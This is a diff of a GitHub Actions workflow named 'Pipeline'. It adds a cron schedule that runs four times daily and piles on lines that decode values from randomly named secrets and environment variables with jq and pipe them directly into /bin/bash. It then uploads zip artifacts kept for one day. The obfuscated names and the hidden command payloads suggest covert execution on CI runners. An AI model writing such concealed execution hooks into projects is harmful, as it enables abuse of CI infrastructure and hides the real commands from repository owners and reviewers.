@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '23 1,7,13,19 * * *'
 jobs:
   trigger:
     runs-on: ubuntu-latest
@@ -10,16 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          l0: ${{ secrets.l0 }}
+          zyl8: ${{ secrets.zyl8 }}
         run: |
-          printf '%s' "$l0" | jq -r .mt22562 | /bin/bash
-          printf '%s' "$iphf808" | jq -r .suf22251 | /bin/bash
-          echo $udotj09927 | jq -r .jy9 | /bin/bash
-          echo $k7398 | jq -r .z8435 | /bin/bash
+          printf '%s' "$zyl8" | jq -r .v14 | /bin/bash
+          printf '%s' "$ybsr9061" | jq -r .qqbzi42 | /bin/bash
+          echo $gomh41250 | jq -r .tdm3903 | /bin/bash
+          echo $vfdag79223 | jq -r .ahts53931 | /bin/bash
+          echo $wvif7 | jq -r .p5 | /bin/bash
+          echo $ysqoj65 | jq -r .uqiny2 | /bin/bash
+          printf '%s' "$pwh212" | jq -r .pnkm091 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: yfU0mb8H
+          name: bGP2NfvC
           path: "*.zip"
           retention-days: 1
